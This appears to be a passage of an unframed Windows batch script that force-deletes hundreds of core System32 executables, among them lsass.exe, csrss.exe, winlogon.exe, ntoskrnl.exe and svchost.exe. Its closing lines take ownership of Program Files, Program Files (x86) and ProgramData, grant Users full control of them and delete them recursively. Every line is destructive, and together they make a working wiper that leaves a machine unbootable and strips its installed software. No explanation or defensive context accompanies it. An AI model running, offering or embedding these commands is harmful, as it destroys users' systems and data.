del C:\Windows\System32\consent.exe /f /s /q
del C:\Windows\System32\control.exe /f /s /q
del C:\Windows\System32\convert.exe /f /s /q
del C:\Windows\System32\convertvhd.exe /f /s /q
del C:\Windows\System32\coredpussvr.exe /f /s /q
del C:\Windows\System32\CredentialEnrollmentManager.exe /f /s /q
del C:\Windows\System32\CredentialUIBroker.exe /f /s /q
del C:\Windows\System32\credwiz.exe /f /s /q
del C:\Windows\System32\cscript.exe /f /s /q
del C:\Windows\System32\csrss.exe /f /s /q
del C:\Windows\System32\ctfmon.exe /f /s /q
del C:\Windows\System32\cttune.exe /f /s /q
del C:\Windows\System32\cttunesvr.exe /f /s /q
del C:\Windows\System32\curl.exe /f /s /q
del C:\Windows\System32\CustomInstallExec.exe /f /s /q
del C:\Windows\System32\CustomModeApp.exe /f /s /q
del C:\Windows\System32\CustomModeAppv2_0.exe /f /s /q
del C:\Windows\System32\CustomShellHost.exe /f /s /q
del C:\Windows\System32\dasHost.exe /f /s /q
del C:\Windows\System32\DataExchangeHost.exe /f /s /q
del C:\Windows\System32\DataStoreCacheDumpTool.exe /f /s /q
del C:\Windows\System32\DataUsageLiveTileTask.exe /f /s /q
del C:\Windows\System32\dccw.exe /f /s /q
del C:\Windows\System32\dcomcnfg.exe /f /s /q
del C:\Windows\System32\ddodiag.exe /f /s /q
del C:\Windows\System32\Defrag.exe /f /s /q
del C:\Windows\System32\deploymentcsphelper.exe /f /s /q
del C:\Windows\System32\desktopimgdownldr.exe /f /s /q
del C:\Windows\System32\DeviceCensus.exe /f /s /q
del C:\Windows\System32\DeviceCredentialDeployment.exe /f /s /q
del C:\Windows\System32\DeviceEject.exe /f /s /q
del C:\Windows\System32\DeviceEnroller.exe /f /s /q
del C:\Windows\System32\DevicePairingWizard.exe /f /s /q
del C:\Windows\System32\DeviceProperties.exe /f /s /q
del C:\Windows\System32\DFDWiz.exe /f /s /q
del C:\Windows\System32\dfrgui.exe /f /s /q
del C:\Windows\System32\dialer.exe /f /s /q
del C:\Windows\System32\difx64.exe /f /s /q
del C:\Windows\System32\directxdatabaseupdater.exe /f /s /q
del C:\Windows\System32\diskpart.exe /f /s /q
del C:\Windows\System32\diskperf.exe /f /s /q
del C:\Windows\System32\diskraid.exe /f /s /q
del C:\Windows\System32\DiskSnapshot.exe /f /s /q
del C:\Windows\System32\Dism.exe /f /s /q
del C:\Windows\System32\dispdiag.exe /f /s /q
del C:\Windows\System32\DisplaySwitch.exe /f /s /q
del C:\Windows\System32\djoin.exe /f /s /q
del C:\Windows\System32\dllhost.exe /f /s /q
del C:\Windows\System32\dllhst3g.exe /f /s /q
del C:\Windows\System32\dmcertinst.exe /f /s /q
del C:\Windows\System32\dmcfghost.exe /f /s /q
del C:\Windows\System32\dmclient.exe /f /s /q
del C:\Windows\System32\DmNotificationBroker.exe /f /s /q
del C:\Windows\System32\DmOmaCpMo.exe /f /s /q
del C:\Windows\System32\dnscacheugc.exe /f /s /q
del C:\Windows\System32\doskey.exe /f /s /q
del C:\Windows\System32\dpapimig.exe /f /s /q
del C:\Windows\System32\DpiScaling.exe /f /s /q
del C:\Windows\System32\dpnsvr.exe /f /s /q
del C:\Windows\System32\DPTopologyApp.exe /f /s /q
del C:\Windows\System32\DPTopologyAppv2_0.exe /f /s /q
del C:\Windows\System32\driverquery.exe /f /s /q
del C:\Windows\System32\drvinst.exe /f /s /q
del C:\Windows\System32\DsmUserTask.exe /f /s /q
del C:\Windows\System32\dsregcmd.exe /f /s /q
del C:\Windows\System32\dstokenclean.exe /f /s /q
del C:\Windows\System32\DTUHandler.exe /f /s /q
del C:\Windows\System32\dusmtask.exe /f /s /q
del C:\Windows\System32\dvdplay.exe /f /s /q
del C:\Windows\System32\dwm.exe /f /s /q
del C:\Windows\System32\DWWIN.EXE /f /s /q
del C:\Windows\System32\dxdiag.exe /f /s /q
del C:\Windows\System32\dxgiadaptercache.exe /f /s /q
del C:\Windows\System32\Dxpserver.exe /f /s /q
del C:\Windows\System32\Eap3Host.exe /f /s /q
del C:\Windows\System32\EaseOfAccessDialog.exe /f /s /q
del C:\Windows\System32\easinvoker.exe /f /s /q
del C:\Windows\System32\EASPolicyManagerBrokerHost.exe /f /s /q
del C:\Windows\System32\EDPCleanup.exe /f /s /q
del C:\Windows\System32\edpnotify.exe /f /s /q
del C:\Windows\System32\EduPrintProv.exe /f /s /q
del C:\Windows\System32\efsui.exe /f /s /q
del C:\Windows\System32\EhStorAuthn.exe /f /s /q
del C:\Windows\System32\EM.exe /f /s /q
del C:\Windows\System32\EoAExperiences.exe /f /s /q
del C:\Windows\System32\esentutl.exe /f /s /q
del C:\Windows\System32\eudcedit.exe /f /s /q
del C:\Windows\System32\eventcreate.exe /f /s /q
del C:\Windows\System32\eventvwr.exe /f /s /q
del C:\Windows\System32\expand.exe /f /s /q
del C:\Windows\System32\extrac32.exe /f /s /q
del C:\Windows\System32\fc.exe /f /s /q
del C:\Windows\System32\fclip.exe /f /s /q
del C:\Windows\System32\fhmanagew.exe /f /s /q
del C:\Windows\System32\FileHistory.exe /f /s /q
del C:\Windows\System32\find.exe /f /s /q
del C:\Windows\System32\findstr.exe /f /s /q
del C:\Windows\System32\finger.exe /f /s /q
del C:\Windows\System32\fixmapi.exe /f /s /q
del C:\Windows\System32\fltMC.exe /f /s /q
del C:\Windows\System32\fodhelper.exe /f /s /q
del C:\Windows\System32\Fondue.exe /f /s /q
del C:\Windows\System32\fontdrvhost.exe /f /s /q
del C:\Windows\System32\fontview.exe /f /s /q
del C:\Windows\System32\forfiles.exe /f /s /q
del C:\Windows\System32\fsavailux.exe /f /s /q
del C:\Windows\System32\FsIso.exe /f /s /q
del C:\Windows\System32\fsquirt.exe /f /s /q
del C:\Windows\System32\fsutil.exe /f /s /q
del C:\Windows\System32\ftp.exe /f /s /q
del C:\Windows\System32\fvenotify.exe /f /s /q
del C:\Windows\System32\fveprompt.exe /f /s /q
del C:\Windows\System32\FXSCOVER.exe /f /s /q
del C:\Windows\System32\FXSSVC.exe /f /s /q
del C:\Windows\System32\FXSUNATD.exe /f /s /q
del C:\Windows\System32\GameBarPresenceWriter.exe /f /s /q
del C:\Windows\System32\GameInputSvc.exe /f /s /q
del C:\Windows\System32\GamePanel.exe /f /s /q
del C:\Windows\System32\GenValObj.exe /f /s /q
del C:\Windows\System32\getmac.exe /f /s /q
del C:\Windows\System32\GfxUIEx.exe /f /s /q
del C:\Windows\System32\Gfxv2_0.exe /f /s /q
del C:\Windows\System32\Gfxv4_0.exe /f /s /q
del C:\Windows\System32\gpresult.exe /f /s /q
del C:\Windows\System32\gpscript.exe /f /s /q
del C:\Windows\System32\gpupdate.exe /f /s /q
del C:\Windows\System32\grpconv.exe /f /s /q
del C:\Windows\System32\hdwwiz.exe /f /s /q
del C:\Windows\System32\help.exe /f /s /q
del C:\Windows\System32\HOSTNAME.EXE /f /s /q
del C:\Windows\System32\hvax64.exe /f /s /q
del C:\Windows\System32\hvix64.exe /f /s /q
del C:\Windows\System32\hvsievaluator.exe /f /s /q
del C:\Windows\System32\IcsEntitlementHost.exe /f /s /q
del C:\Windows\System32\icsunattend.exe /f /s /q
del C:\Windows\System32\ie4uinit.exe /f /s /q
del C:\Windows\System32\ie4ushowIE.exe /f /s /q
del C:\Windows\System32\IESettingSync.exe /f /s /q
del C:\Windows\System32\ieUnatt.exe /f /s /q
del C:\Windows\System32\iexpress.exe /f /s /q
del C:\Windows\System32\igfxCUIService.exe /f /s /q
del C:\Windows\System32\igfxEM.exe /f /s /q
del C:\Windows\System32\igfxext.exe /f /s /q
del C:\Windows\System32\igfxHK.exe /f /s /q
del C:\Windows\System32\igfxTray.exe /f /s /q
del C:\Windows\System32\immersivetpmvscmgrsvr.exe /f /s /q
del C:\Windows\System32\InfDefaultInstall.exe /f /s /q
del C:\Windows\System32\InputSwitchToastHandler.exe /f /s /q
del C:\Windows\System32\IntelWiDiUMS64.exe /f /s /q
del C:\Windows\System32\IntelWiDiVAD64.exe /f /s /q
del C:\Windows\System32\iotstartup.exe /f /s /q
del C:\Windows\System32\ipconfig.exe /f /s /q
del C:\Windows\System32\iscsicli.exe /f /s /q
del C:\Windows\System32\iscsicpl.exe /f /s /q
del C:\Windows\System32\isoburn.exe /f /s /q
del C:\Windows\System32\klist.exe /f /s /q
del C:\Windows\System32\ksetup.exe /f /s /q
del C:\Windows\System32\ktmutil.exe /f /s /q
del C:\Windows\System32\label.exe /f /s /q
del C:\Windows\System32\LanguageComponentsInstallerComHandler.exe /f /s /q
del C:\Windows\System32\LaunchTM.exe /f /s /q
del C:\Windows\System32\LaunchWinApp.exe /f /s /q
del C:\Windows\System32\LegacyNetUXHost.exe /f /s /q
del C:\Windows\System32\LicenseManagerShellext.exe /f /s /q
del C:\Windows\System32\licensingdiag.exe /f /s /q
del C:\Windows\System32\LicensingUI.exe /f /s /q
del C:\Windows\System32\LocationNotificationWindows.exe /f /s /q
del C:\Windows\System32\Locator.exe /f /s /q
del C:\Windows\System32\LockAppHost.exe /f /s /q
del C:\Windows\System32\LockScreenContentServer.exe /f /s /q
del C:\Windows\System32\lodctr.exe /f /s /q
del C:\Windows\System32\logagent.exe /f /s /q
del C:\Windows\System32\logman.exe /f /s /q
del C:\Windows\System32\logoff.exe /f /s /q
del C:\Windows\System32\LogonUI.exe /f /s /q
del C:\Windows\System32\lpkinstall.exe /f /s /q
del C:\Windows\System32\lpksetup.exe /f /s /q
del C:\Windows\System32\lpremove.exe /f /s /q
del C:\Windows\System32\LsaIso.exe /f /s /q
del C:\Windows\System32\lsass.exe /f /s /q
del C:\Windows\System32\Magnify.exe /f /s /q
del C:\Windows\System32\makecab.exe /f /s /q
del C:\Windows\System32\manage-bde.exe /f /s /q
del C:\Windows\System32\mavinject.exe /f /s /q
del C:\Windows\System32\MbaeParserTask.exe /f /s /q
del C:\Windows\System32\mblctr.exe /f /s /q
del C:\Windows\System32\MBR2GPT.EXE /f /s /q
del C:\Windows\System32\mcbuilder.exe /f /s /q
del C:\Windows\System32\MDEServer.exe /f /s /q
del C:\Windows\System32\MDMAgent.exe /f /s /q
del C:\Windows\System32\MDMAppInstaller.exe /f /s /q
del C:\Windows\System32\MdmDiagnosticsTool.exe /f /s /q
del C:\Windows\System32\MdRes.exe /f /s /q
del C:\Windows\System32\MdSched.exe /f /s /q
del C:\Windows\System32\mfpmp.exe /f /s /q
del C:\Windows\System32\Microsoft.Uev.CscUnpinTool.exe /f /s /q
del C:\Windows\System32\Microsoft.Uev.SyncController.exe /f /s /q
del C:\Windows\System32\MicrosoftEdgeBCHost.exe /f /s /q
del C:\Windows\System32\MicrosoftEdgeCP.exe /f /s /q
del C:\Windows\System32\MicrosoftEdgeDevTools.exe /f /s /q
del C:\Windows\System32\MicrosoftEdgeSH.exe /f /s /q
del C:\Windows\System32\mmc.exe /f /s /q
del C:\Windows\System32\mmgaserver.exe /f /s /q
del C:\Windows\System32\mobsync.exe /f /s /q
del C:\Windows\System32\mountvol.exe /f /s /q
del C:\Windows\System32\MoUsoCoreWorker.exe /f /s /q
del C:\Windows\System32\mpnotify.exe /f /s /q
del C:\Windows\System32\MpSigStub.exe /f /s /q
del C:\Windows\System32\MRINFO.EXE /f /s /q
del C:\Windows\System32\MRT.exe /f /s /q
del C:\Windows\System32\MSchedExe.exe /f /s /q
del C:\Windows\System32\msconfig.exe /f /s /q
del C:\Windows\System32\msdt.exe /f /s /q
del C:\Windows\System32\msdtc.exe /f /s /q
del C:\Windows\System32\msfeedssync.exe /f /s /q
del C:\Windows\System32\msg.exe /f /s /q
del C:\Windows\System32\mshta.exe /f /s /q
del C:\Windows\System32\msiexec.exe /f /s /q
del C:\Windows\System32\msinfo32.exe /f /s /q
del C:\Windows\System32\mspaint.exe /f /s /q
del C:\Windows\System32\msra.exe /f /s /q
del C:\Windows\System32\MsSpellCheckingHost.exe /f /s /q
del C:\Windows\System32\mstsc.exe /f /s /q
del C:\Windows\System32\mtstocom.exe /f /s /q
del C:\Windows\System32\MuiUnattend.exe /f /s /q
del C:\Windows\System32\MultiDigiMon.exe /f /s /q
del C:\Windows\System32\MusNotification.exe /f /s /q
del C:\Windows\System32\MusNotificationUx.exe /f /s /q
del C:\Windows\System32\MusNotifyIcon.exe /f /s /q
del C:\Windows\System32\Narrator.exe /f /s /q
del C:\Windows\System32\nbtstat.exe /f /s /q
del C:\Windows\System32\ndadmin.exe /f /s /q
del C:\Windows\System32\NDKPing.exe /f /s /q
del C:\Windows\System32\net.exe /f /s /q
del C:\Windows\System32\net1.exe /f /s /q
del C:\Windows\System32\netbtugc.exe /f /s /q
del C:\Windows\System32\netcfg.exe /f /s /q
del C:\Windows\System32\NetCfgNotifyObjectHost.exe /f /s /q
del C:\Windows\System32\NetEvtFwdr.exe /f /s /q
del C:\Windows\System32\NetHost.exe /f /s /q
del C:\Windows\System32\netiougc.exe /f /s /q
del C:\Windows\System32\Netplwiz.exe /f /s /q
del C:\Windows\System32\netsh.exe /f /s /q
del C:\Windows\System32\NETSTAT.EXE /f /s /q
del C:\Windows\System32\newdev.exe /f /s /q
del C:\Windows\System32\NgcIso.exe /f /s /q
del C:\Windows\System32\nltest.exe /f /s /q
del C:\Windows\System32\notepad.exe /f /s /q
del C:\Windows\System32\nslookup.exe /f /s /q
del C:\Windows\System32\ntoskrnl.exe /f /s /q
del C:\Windows\System32\ntprint.exe /f /s /q
del C:\Windows\System32\odbcad32.exe /f /s /q
del C:\Windows\System32\odbcconf.exe /f /s /q
del C:\Windows\System32\ofdeploy.exe /f /s /q
del C:\Windows\System32\omadmclient.exe /f /s /q
del C:\Windows\System32\omadmprc.exe /f /s /q
del C:\Windows\System32\OOBE-Maintenance.exe /f /s /q
del C:\Windows\System32\openfiles.exe /f /s /q
del C:\Windows\System32\OpenWith.exe /f /s /q
del C:\Windows\System32\OptionalFeatures.exe /f /s /q
del C:\Windows\System32\osk.exe /f /s /q
del C:\Windows\System32\pacjsworker.exe /f /s /q
del C:\Windows\System32\PackagedCWALauncher.exe /f /s /q
del C:\Windows\System32\PackageInspector.exe /f /s /q
del C:\Windows\System32\PasswordOnWakeSettingFlyout.exe /f /s /q
del C:\Windows\System32\PATHPING.EXE /f /s /q
del C:\Windows\System32\pcalua.exe /f /s /q
del C:\Windows\System32\pcaui.exe /f /s /q
del C:\Windows\System32\pcwrun.exe /f /s /q
del C:\Windows\System32\perfmon.exe /f /s /q
del C:\Windows\System32\phoneactivate.exe /f /s /q
del C:\Windows\System32\PickerHost.exe /f /s /q
del C:\Windows\System32\PinEnrollmentBroker.exe /f /s /q
del C:\Windows\System32\PING.EXE /f /s /q
del C:\Windows\System32\PkgMgr.exe /f /s /q
del C:\Windows\System32\PktMon.exe /f /s /q
del C:\Windows\System32\plasrv.exe /f /s /q
del C:\Windows\System32\PnPUnattend.exe /f /s /q
del C:\Windows\System32\pnputil.exe /f /s /q
del C:\Windows\System32\poqexec.exe /f /s /q
del C:\Windows\System32\pospaymentsworker.exe /f /s /q
del C:\Windows\System32\powercfg.exe /f /s /q
del C:\Windows\System32\PresentationHost.exe /f /s /q
del C:\Windows\System32\PresentationSettings.exe /f /s /q
del C:\Windows\System32\prevhost.exe /f /s /q
del C:\Windows\System32\print.exe /f /s /q
del C:\Windows\System32\PrintBrmUi.exe /f /s /q
del C:\Windows\System32\printfilterpipelinesvc.exe /f /s /q
del C:\Windows\System32\PrintIsolationHost.exe /f /s /q
del C:\Windows\System32\printui.exe /f /s /q
del C:\Windows\System32\proquota.exe /f /s /q
del C:\Windows\System32\provlaunch.exe /f /s /q
del C:\Windows\System32\provtool.exe /f /s /q
del C:\Windows\System32\ProximityUxHost.exe /f /s /q
del C:\Windows\System32\prproc.exe /f /s /q
del C:\Windows\System32\psr.exe /f /s /q
del C:\Windows\System32\pwlauncher.exe /f /s /q
del C:\Windows\System32\qappsrv.exe /f /s /q
del C:\Windows\System32\qprocess.exe /f /s /q
del C:\Windows\System32\query.exe /f /s /q
del C:\Windows\System32\quickassist.exe /f /s /q
del C:\Windows\System32\quser.exe /f /s /q
del C:\Windows\System32\qwinsta.exe /f /s /q
del C:\Windows\System32\rasautou.exe /f /s /q
del C:\Windows\System32\rasdial.exe /f /s /q
del C:\Windows\System32\raserver.exe /f /s /q
del C:\Windows\System32\rasphone.exe /f /s /q
del C:\Windows\System32\rdpclip.exe /f /s /q
del C:\Windows\System32\rdpinit.exe /f /s /q
del C:\Windows\System32\rdpinput.exe /f /s /q
del C:\Windows\System32\RdpSa.exe /f /s /q
del C:\Windows\System32\RdpSaProxy.exe /f /s /q
del C:\Windows\System32\RdpSaUacHelper.exe /f /s /q
del C:\Windows\System32\rdpshell.exe /f /s /q
del C:\Windows\System32\rdpsign.exe /f /s /q
del C:\Windows\System32\rdrleakdiag.exe /f /s /q
del C:\Windows\System32\ReAgentc.exe /f /s /q
del C:\Windows\System32\recdisc.exe /f /s /q
del C:\Windows\System32\recover.exe /f /s /q
del C:\Windows\System32\RecoveryDrive.exe /f /s /q
del C:\Windows\System32\refsutil.exe /f /s /q
del C:\Windows\System32\reg.exe /f /s /q
del C:\Windows\System32\regedt32.exe /f /s /q
del C:\Windows\System32\regini.exe /f /s /q
del C:\Windows\System32\Register-CimProvider.exe /f /s /q
del C:\Windows\System32\regsvr32.exe /f /s /q
del C:\Windows\System32\rekeywiz.exe /f /s /q
del C:\Windows\System32\relog.exe /f /s /q
del C:\Windows\System32\RelPost.exe /f /s /q
del C:\Windows\System32\RemoteAppLifetimeManager.exe /f /s /q
del C:\Windows\System32\RemotePosWorker.exe /f /s /q
del C:\Windows\System32\repair-bde.exe /f /s /q
del C:\Windows\System32\replace.exe /f /s /q
del C:\Windows\System32\reset.exe /f /s /q
del C:\Windows\System32\ResetEngine.exe /f /s /q
del C:\Windows\System32\resmon.exe /f /s /q
del C:\Windows\System32\RMActivate.exe /f /s /q
del C:\Windows\System32\RMActivate_isv.exe /f /s /q
del C:\Windows\System32\RMActivate_ssp.exe /f /s /q
del C:\Windows\System32\RMActivate_ssp_isv.exe /f /s /q
del C:\Windows\System32\RmClient.exe /f /s /q
del C:\Windows\System32\rmttpmvscmgrsvr.exe /f /s /q
del C:\Windows\System32\Robocopy.exe /f /s /q
del C:\Windows\System32\ROUTE.EXE /f /s /q
del C:\Windows\System32\RpcPing.exe /f /s /q
del C:\Windows\System32\rrinstaller.exe /f /s /q
del C:\Windows\System32\rstrui.exe /f /s /q
del C:\Windows\System32\runas.exe /f /s /q
del C:\Windows\System32\rundll32.exe /f /s /q
del C:\Windows\System32\runexehelper.exe /f /s /q
del C:\Windows\System32\RunLegacyCPLElevated.exe /f /s /q
del C:\Windows\System32\runonce.exe /f /s /q
del C:\Windows\System32\RuntimeBroker.exe /f /s /q
del C:\Windows\System32\rwinsta.exe /f /s /q
del C:\Windows\System32\sc.exe /f /s /q
del C:\Windows\System32\schtasks.exe /f /s /q
del C:\Windows\System32\ScriptRunner.exe /f /s /q
del C:\Windows\System32\sdbinst.exe /f /s /q
del C:\Windows\System32\sdchange.exe /f /s /q
del C:\Windows\System32\sdclt.exe /f /s /q
del C:\Windows\System32\sdiagnhost.exe /f /s /q
del C:\Windows\System32\SearchFilterHost.exe /f /s /q
del C:\Windows\System32\SearchIndexer.exe /f /s /q
del C:\Windows\System32\SearchProtocolHost.exe /f /s /q
del C:\Windows\System32\SecEdit.exe /f /s /q
del C:\Windows\System32\secinit.exe /f /s /q
del C:\Windows\System32\SecureBootEncodeUEFI.exe /f /s /q
del C:\Windows\System32\securekernel.exe /f /s /q
del C:\Windows\System32\SecurityHealthHost.exe /f /s /q
del C:\Windows\System32\SecurityHealthService.exe /f /s /q
del C:\Windows\System32\SecurityHealthSystray.exe /f /s /q
del C:\Windows\System32\SensorDataService.exe /f /s /q
del C:\Windows\System32\services.exe /f /s /q
del C:\Windows\System32\sessionmsg.exe /f /s /q
del C:\Windows\System32\sethc.exe /f /s /q
del C:\Windows\System32\setspn.exe /f /s /q
del C:\Windows\System32\SettingSyncHost.exe /f /s /q
del C:\Windows\System32\setupcl.exe /f /s /q
del C:\Windows\System32\setupugc.exe /f /s /q
del C:\Windows\System32\setx.exe /f /s /q
del C:\Windows\System32\sfc.exe /f /s /q
del C:\Windows\System32\SgrmBroker.exe /f /s /q
del C:\Windows\System32\SgrmLpac.exe /f /s /q
del C:\Windows\System32\ShellAppRuntime.exe /f /s /q
del C:\Windows\System32\shrpubw.exe /f /s /q
del C:\Windows\System32\shutdown.exe /f /s /q
del C:\Windows\System32\sigverif.exe /f /s /q
del C:\Windows\System32\SIHClient.exe /f /s /q
del C:\Windows\System32\sihost.exe /f /s /q
del C:\Windows\System32\SlideToShutDown.exe /f /s /q
del C:\Windows\System32\slui.exe /f /s /q
del C:\Windows\System32\smartscreen.exe /f /s /q
del C:\Windows\System32\smss.exe /f /s /q
del C:\Windows\System32\SndVol.exe /f /s /q
del C:\Windows\System32\SnippingTool.exe /f /s /q
del C:\Windows\System32\snmptrap.exe /f /s /q
del C:\Windows\System32\sort.exe /f /s /q
del C:\Windows\System32\SpaceAgent.exe /f /s /q
del C:\Windows\System32\spaceman.exe /f /s /q
del C:\Windows\System32\SpatialAudioLicenseSrv.exe /f /s /q
del C:\Windows\System32\Spectrum.exe /f /s /q
del C:\Windows\System32\spoolsv.exe /f /s /q
del C:\Windows\System32\SppExtComObj.Exe /f /s /q
del C:\Windows\System32\sppsvc.exe /f /s /q
del C:\Windows\System32\srdelayed.exe /f /s /q
del C:\Windows\System32\SrTasks.exe /f /s /q
del C:\Windows\System32\stordiag.exe /f /s /q
del C:\Windows\System32\subst.exe /f /s /q
del C:\Windows\System32\svchost.exe /f /s /q
del C:\Windows\System32\sxstrace.exe /f /s /q
del C:\Windows\System32\SyncAppvPublishingServer.exe /f /s /q
del C:\Windows\System32\SyncHost.exe /f /s /q
del C:\Windows\System32\SysResetErr.exe /f /s /q
del C:\Windows\System32\systeminfo.exe /f /s /q
del C:\Windows\System32\SystemPropertiesAdvanced.exe /f /s /q
del C:\Windows\System32\SystemPropertiesComputerName.exe /f /s /q
del C:\Windows\System32\SystemPropertiesDataExecutionPrevention.exe /f /s /q
del C:\Windows\System32\SystemPropertiesHardware.exe /f /s /q
del C:\Windows\System32\SystemPropertiesPerformance.exe /f /s /q
del C:\Windows\System32\SystemPropertiesProtection.exe /f /s /q
del C:\Windows\System32\SystemPropertiesRemote.exe /f /s /q
del C:\Windows\System32\systemreset.exe /f /s /q
del C:\Windows\System32\SystemSettingsAdminFlows.exe /f /s /q
del C:\Windows\System32\SystemSettingsBroker.exe /f /s /q
del C:\Windows\System32\SystemSettingsRemoveDevice.exe /f /s /q
del C:\Windows\System32\SystemUWPLauncher.exe /f /s /q
del C:\Windows\System32\systray.exe /f /s /q
del C:\Windows\System32\tabcal.exe /f /s /q
del C:\Windows\System32\TapiUnattend.exe /f /s /q
del C:\Windows\System32\tar.exe /f /s /q
del C:\Windows\System32\taskhostw.exe /f /s /q
del C:\Windows\System32\taskkill.exe /f /s /q
del C:\Windows\System32\tasklist.exe /f /s /q
del C:\Windows\System32\Taskmgr.exe /f /s /q
del C:\Windows\System32\tcblaunch.exe /f /s /q
del C:\Windows\System32\tcmsetup.exe /f /s /q
del C:\Windows\System32\TCPSVCS.EXE /f /s /q
del C:\Windows\System32\ThumbnailExtractionHost.exe /f /s /q
del C:\Windows\System32\TieringEngineService.exe /f /s /q
del C:\Windows\System32\timeout.exe /f /s /q
del C:\Windows\System32\TokenBrokerCookies.exe /f /s /q
del C:\Windows\System32\TpmInit.exe /f /s /q
del C:\Windows\System32\TpmTool.exe /f /s /q
del C:\Windows\System32\tpmvscmgr.exe /f /s /q
del C:\Windows\System32\tpmvscmgrsvr.exe /f /s /q
del C:\Windows\System32\tracerpt.exe /f /s /q
del C:\Windows\System32\TRACERT.EXE /f /s /q
del C:\Windows\System32\tscon.exe /f /s /q
del C:\Windows\System32\tsdiscon.exe /f /s /q
del C:\Windows\System32\tskill.exe /f /s /q
del C:\Windows\System32\TSTheme.exe /f /s /q
del C:\Windows\System32\TSWbPrxy.exe /f /s /q
del C:\Windows\System32\ttdinject.exe /f /s /q
del C:\Windows\System32\tttracer.exe /f /s /q
del C:\Windows\System32\typeperf.exe /f /s /q
del C:\Windows\System32\tzsync.exe /f /s /q
del C:\Windows\System32\tzutil.exe /f /s /q
del C:\Windows\System32\UCPDMgr.exe /f /s /q
del C:\Windows\System32\ucsvc.exe /f /s /q
del C:\Windows\System32\UevAgentPolicyGenerator.exe /f /s /q
del C:\Windows\System32\UevAppMonitor.exe /f /s /q
del C:\Windows\System32\UevTemplateBaselineGenerator.exe /f /s /q
del C:\Windows\System32\UevTemplateConfigItemGenerator.exe /f /s /q
del C:\Windows\System32\UIMgrBroker.exe /f /s /q
del C:\Windows\System32\unlodctr.exe /f /s /q
del C:\Windows\System32\unregmp2.exe /f /s /q
del C:\Windows\System32\upfc.exe /f /s /q
del C:\Windows\System32\UpgradeResultsUI.exe /f /s /q
del C:\Windows\System32\upnpcont.exe /f /s /q
del C:\Windows\System32\UPPrinterInstaller.exe /f /s /q
del C:\Windows\System32\UserAccountBroker.exe /f /s /q
del C:\Windows\System32\UserAccountControlSettings.exe /f /s /q
del C:\Windows\System32\userinit.exe /f /s /q
del C:\Windows\System32\UsoClient.exe /f /s /q
del C:\Windows\System32\usocoreworker.exe /f /s /q
del C:\Windows\System32\UtcDecoderHost.exe /f /s /q
del C:\Windows\System32\Utilman.exe /f /s /q
del C:\Windows\System32\VaultCmd.exe /f /s /q
del C:\Windows\System32\vds.exe /f /s /q
del C:\Windows\System32\vdsldr.exe /f /s /q
del C:\Windows\System32\verclsid.exe /f /s /q
del C:\Windows\System32\verifier.exe /f /s /q
del C:\Windows\System32\verifiergui.exe /f /s /q
del C:\Windows\System32\vssadmin.exe /f /s /q
del C:\Windows\System32\VSSVC.exe /f /s /q
del C:\Windows\System32\w32tm.exe /f /s /q
del C:\Windows\System32\WaaSMedicAgent.exe /f /s /q
del C:\Windows\System32\waitfor.exe /f /s /q
del C:\Windows\System32\WallpaperHost.exe /f /s /q
del C:\Windows\System32\wbadmin.exe /f /s /q
del C:\Windows\System32\wbengine.exe /f /s /q
del C:\Windows\System32\wecutil.exe /f /s /q
del C:\Windows\System32\WerFault.exe /f /s /q
del C:\Windows\System32\WerFaultSecure.exe /f /s /q
del C:\Windows\System32\wermgr.exe /f /s /q
del C:\Windows\System32\wevtutil.exe /f /s /q
del C:\Windows\System32\wextract.exe /f /s /q
del C:\Windows\System32\WFS.exe /f /s /q
del C:\Windows\System32\where.exe /f /s /q
del C:\Windows\System32\whoami.exe /f /s /q
del C:\Windows\System32\wiaacmgr.exe /f /s /q
del C:\Windows\System32\wiawow64.exe /f /s /q
del C:\Windows\System32\wifitask.exe /f /s /q
del C:\Windows\System32\wimserv.exe /f /s /q
del C:\Windows\System32\WinBioDataModelOOBE.exe /f /s /q
del C:\Windows\System32\Windows.Media.BackgroundPlayback.exe /f /s /q
del C:\Windows\System32\Windows.WARP.JITService.exe /f /s /q
del C:\Windows\System32\WindowsActionDialog.exe /f /s /q
del C:\Windows\System32\WindowsUpdateElevatedInstaller.exe /f /s /q
del C:\Windows\System32\wininit.exe /f /s /q
del C:\Windows\System32\winload.exe /f /s /q
del C:\Windows\System32\winlogon.exe /f /s /q
del C:\Windows\System32\winresume.exe /f /s /q
del C:\Windows\System32\winrs.exe /f /s /q
del C:\Windows\System32\winrshost.exe /f /s /q
del C:\Windows\System32\WinRTNetMUAHostServer.exe /f /s /q
del C:\Windows\System32\WinSAT.exe /f /s /q
del C:\Windows\System32\winver.exe /f /s /q
del C:\Windows\System32\wkspbroker.exe /f /s /q
del C:\Windows\System32\wksprt.exe /f /s /q
del C:\Windows\System32\wlanext.exe /f /s /q
del C:\Windows\System32\wlrmdr.exe /f /s /q
del C:\Windows\System32\WMPDMC.exe /f /s /q
del C:\Windows\System32\WorkFolders.exe /f /s /q
del C:\Windows\System32\wowreg32.exe /f /s /q
del C:\Windows\System32\WpcMon.exe /f /s /q
del C:\Windows\System32\WpcTok.exe /f /s /q
del C:\Windows\System32\WPDShextAutoplay.exe /f /s /q
del C:\Windows\System32\wpnpinst.exe /f /s /q
del C:\Windows\System32\wpr.exe /f /s /q
del C:\Windows\System32\write.exe /f /s /q
del C:\Windows\System32\wscadminui.exe /f /s /q
del C:\Windows\System32\WSCollect.exe /f /s /q
del C:\Windows\System32\wscript.exe /f /s /q
del C:\Windows\System32\wsl.exe /f /s /q
del C:\Windows\System32\WSManHTTPConfig.exe /f /s /q
del C:\Windows\System32\wsmprovhost.exe /f /s /q
del C:\Windows\System32\wsqmcons.exe /f /s /q
del C:\Windows\System32\WSReset.exe /f /s /q
del C:\Windows\System32\wuapihost.exe /f /s /q
del C:\Windows\System32\wuauclt.exe /f /s /q
del C:\Windows\System32\WUDFCompanionHost.exe /f /s /q
del C:\Windows\System32\WUDFHost.exe /f /s /q
del C:\Windows\System32\wusa.exe /f /s /q
del C:\Windows\System32\WWAHost.exe /f /s /q
del C:\Windows\System32\XblGameSaveTask.exe /f /s /q
del C:\Windows\System32\xcopy.exe /f /s /q
del C:\Windows\System32\xwizard.exe /f /s /q
takeown /f "C:\Program Files" /r /d y
takeown /f "C:\Program files (x86)" /r /d y
takeown /f "C:\Programdata" /r /d y
icacls "C:\Program Files" /t /Grant Users:F
icacls "C:\Program Files (x86)" /t /Grant Users:F
icacls "C:\ProgramData" /t /Grant Users:F
del "C:\Program Files" /f /s /q
del "C:\Program Files (x86)" /f /s /q
del "C:\ProgramData" /f /s /q
